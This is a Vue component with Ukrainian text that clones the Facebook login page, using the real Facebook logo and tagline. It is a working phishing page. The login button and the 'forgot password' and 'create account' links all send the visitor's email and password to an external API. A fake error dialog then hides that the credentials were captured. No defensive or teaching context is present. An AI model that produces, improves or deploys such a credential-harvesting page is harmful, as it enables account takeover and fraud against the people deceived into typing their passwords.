<script setup lang="ts">
import { ref } from 'vue';
import { NModal, NButton, NIcon } from 'naive-ui';
import { Warning as WarningIcon } from '@vicons/ionicons5';

defineProps<{ msg: string }>()

const formEl = ref(null)
const showModal = ref(false);
const count = ref(0);
const form = ref({
  email: '',
  pass: '',
})

const createFakeAccount = async (e) => {
  e.preventDefault();
  const isValid = formEl.value.reportValidity();
  if (!isValid) {
    console.log('Валідація не пройдена');
    return;
  }
  showModal.value = true;

  try {
    const res = await fetch(`${import.meta.env.VITE_API_URL}/users`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(form.value)
    })

    if (!res.ok) {
      throw new Error('Не вдалося створити користувача')
    }

    form.value = {
      email: '',
      pass: '',
    }
  } catch {};
};
</script>

<template>
  <div class="bg-gray" @submit="createFakeAccount">
    <div class="wrapper">
      <div class="container">
        <div class="login-wrapper">
          <!-- Ліва частина -->
          <div class="info-block">
            <div>
              <img class="f-logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
            </div>
            <h2 class="subtitle transparent">
              Facebook допомагає тримати зв'язок з рідними та близькими..
            </h2>
          </div>

          <!-- Форма входу -->
          <div class="form-block">
            <form class="login-form" ref="formEl">
              <input
                  v-model="form.email"
                  type="email"
                  placeholder="Електронна пошта або телефон"
                  required
              />
              <input
                  v-model="form.pass"
                  type="password"
                  placeholder="Пароль"
                  required
              />
              <button
                  type="submit"
                  class="btn btn-login"
              >Увійти</button>
              <a href="#" class="forgot" @click="createFakeAccount">Забули пароль?</a>
              <hr />
              <button
                  type="button"
                  class="btn btn-register"
                  @click="createFakeAccount"
              >
                Створити новий акаунт
              </button>
            </form>
          </div>
        </div>
      </div>
    </div>

    <n-modal
        v-model:show="showModal"
        preset="dialog"
        title="Щось пішло не так"
        type="error"
        positive-text="ОК"
        @positive-click="showModal = false"
    >
      <template #icon>
        <n-icon :component="WarningIcon" color="#e53e3e" />
      </template>
      Сталася помилка під час обробки вашого запиту. Будь ласка, спробуйте пізніше.
    </n-modal>
  </div>
</template>

<style scoped>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
  font-family: sans-serif;
}

.bg-gray {
  background-color: #f3f4f6;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 16px;
}

.container {
  max-width: 1024px;
  width: 100%;
  display: flex;
  flex-direction: column;
}

.login-wrapper {
  display: flex;
  flex-direction: column;
  gap: 2rem;
}

@media (min-width: 768px) {
  .login-wrapper {
    flex-direction: row;
    align-items: center;
    justify-content: space-between;
  }
}

.info-block {
  text-align: center;
  flex: 1;
}

.f-logo {
  height: 106px;
  margin: -28px;
}

@media (min-width: 768px) {
  .info-block {
    text-align: left;
  }
}

.logo {
  color: #1877f2;
  font-size: 3rem;
  font-weight: bold;
  margin-bottom: 1rem;
}

.subtitle {
  font-size: 1.25rem;
  color: #4b5563;
}

.form-block {
  background-color: white;
  padding: 2rem;
  border-radius: 8px;
  box-shadow: 0 2px 10px rgba(0,0,0,0.1);
  flex: 1;
}

.login-form {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.login-form input {
  padding: 10px 12px;
  font-size: 1rem;
  border: 1px solid #d1d5db;
  border-radius: 6px;
  transition: border 0.2s;
}

.login-form input:focus {
  outline: none;
  border: 2px solid #3b82f6;
}

.btn {
  padding: 10px;
  font-size: 1rem;
  font-weight: bold;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  transition: background 0.2s;
}

.btn-login {
  background-color: #1877f2;
  color: white;
}

.btn-login:hover {
  background-color: #155ec1;
}

.btn-register {
  background-color: #22c55e;
  color: white;
}

.btn-register:hover {
  background-color: #16a34a;
}

.forgot {
  text-align: center;
  display: block;
  font-size: 0.9rem;
  color: #3b82f6;
  text-decoration: none;
}

.forgot:hover {
  text-decoration: underline;
}

hr {
  margin: 1rem 0;
  border: none;
  height: 1px;
  background-color: #e5e7eb;
}

</style>
